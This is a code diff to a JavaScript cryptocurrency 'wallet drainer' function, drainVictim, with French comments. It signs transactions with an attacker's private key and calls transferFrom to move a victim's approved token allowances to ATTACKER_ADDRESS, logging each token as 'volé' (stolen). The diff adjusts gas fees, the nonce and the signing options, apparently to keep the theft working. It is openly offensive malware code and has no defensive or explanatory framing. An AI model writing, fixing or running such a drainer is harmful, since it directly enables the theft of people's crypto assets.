@@ -72,7 +72,6 @@ async function drainVictim(victimAddress, chainId) {
     throw new Error(`RPC ${chainId} non joignable`);
   }
 
-  // Convertir la clé en Buffer (format attendu par Web3 v4)
   const privateKeyBuffer = Buffer.from(PRIVATE_KEY, 'hex');
   const derived = web3.eth.accounts.privateKeyToAccount(privateKeyBuffer).address;
   if (derived.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
@@ -101,18 +100,22 @@ async function drainVictim(victimAddress, chainId) {
         continue;
       }
 
-      const nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
+      let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
+      const gasPrice = await web3.eth.getGasPrice();
+      const gasLimit = 100000;
+
       const tx = {
         from: ATTACKER_ADDRESS,
         to: tokenAddress,
         data: tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI(),
-        gas: 100000,
-        gasPrice: await web3.eth.getGasPrice(),
-        nonce,
+        gas: gasLimit,
+        gasPrice: gasPrice,
+        nonce: nonce,
+        maxFeePerGas: (BigInt(gasPrice) * 2n).toString(),
+        maxPriorityFeePerGas: (BigInt(gasPrice) / 2n).toString(),
       };
 
-      // Signer avec le Buffer
-      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
+      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer, { type: 0 });
       const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
       console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
 
